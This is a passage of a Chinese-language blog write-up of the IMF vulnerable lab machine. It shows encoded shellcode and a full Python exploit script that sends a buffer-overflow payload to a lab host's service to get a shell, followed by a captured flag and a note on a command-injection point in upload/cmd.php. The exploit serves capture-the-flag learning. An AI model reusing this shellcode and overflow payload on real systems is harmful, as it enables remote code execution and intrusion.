+</span></span><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\xc9\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x24\x4e\x9c&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\x5a\xf5\x95\x97\x46\xa6\x6a\x0b\xe3\x4a\xe4\x4a\x43&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\x2c\x3b\x0c\x37\xe9\x73\x32\xf5\x89\x3d\x34\xfc\xe1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\x7d\x6e\x9a\x94\x15\x6d\x63\x74\x4b\xf8\x82\xc8\xf5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\xab\x15\x7b\x49\x48\x1f\x9a\x60\xcf\x4d\x34\x15\xff&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\x02\xac\x81\xd0\xcb\x4e\x3b\xa6\xf7\xdc\xe8\x31\x16&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\x50\x05\x8f\x59&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Python脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># /usr/bin/python2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="n">client</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;192.168.100.142&#39;</span><span class="p">,</span> <span class="mi">7788</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">client</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;48093572</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">client</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;3</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">client</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xba\x74\x40\x7e\xaf\xda\xd6\xd9\x74\x24\xf4\x58\x29</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x24\x4e\x9c</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x5a\xf5\x95\x97\x46\xa6\x6a\x0b\xe3\x4a\xe4\x4a\x43</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2c\x3b\x0c\x37\xe9\x73\x32\xf5\x89\x3d\x34\xfc\xe1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7d\x6e\x9a\x94\x15\x6d\x63\x74\x4b\xf8\x82\xc8\xf5</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xab\x15\x7b\x49\x48\x1f\x9a\x60\xcf\x4d\x34\x15\xff</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x02\xac\x81\xd0\xcb\x4e\x3b\xa6\xf7\xdc\xe8\x31\x16</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x50\x05\x8f\x59</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">168</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x63\x85\x04\x08\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">client</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>监听本地~</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519133457646.png"
+	width="746"
+	height="189"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519133457646_hud8214105bd138c3327689d74ba9d3659_99121_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519133457646_hud8214105bd138c3327689d74ba9d3659_99121_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519133457646"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="394"
+		data-flex-basis="947px"
+	
+></p>
+<p>Flag6{R2gwc3RQcm90MGMwbHM=}</p>
+<p>后续登录之后，php文件分析查看</p>
+<p>upload/index.php</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145040561.png"
+	width="892"
+	height="766"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145040561_hufa85982973ed07e101868dc1e167e7ec_152244_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519145040561_hufa85982973ed07e101868dc1e167e7ec_152244_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519145040561"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="279px"
+	
+></p>
+<p>upload/cmd.php 注入点</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145238147.png"
+	width="773"
+	height="670"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145238147_hud00bd2b8bc292adddcd2450c56996fbb_116109_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519145238147_hud00bd2b8bc292adddcd2450c56996fbb_116109_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519145238147"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="115"
+		data-flex-basis="276px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/python/">python</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/pyenv/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image31.png" loading="lazy" data-key="" data-hash="/image31.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Pyenv</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2023 main1o&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        
+            <img src="https://icp.gov.moe/favicon.ico" alt width="15px" height="15px"><a href="https://icp.gov.moe/?keyword=20229978" target="_blank">萌ICP备20229978号</a> <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
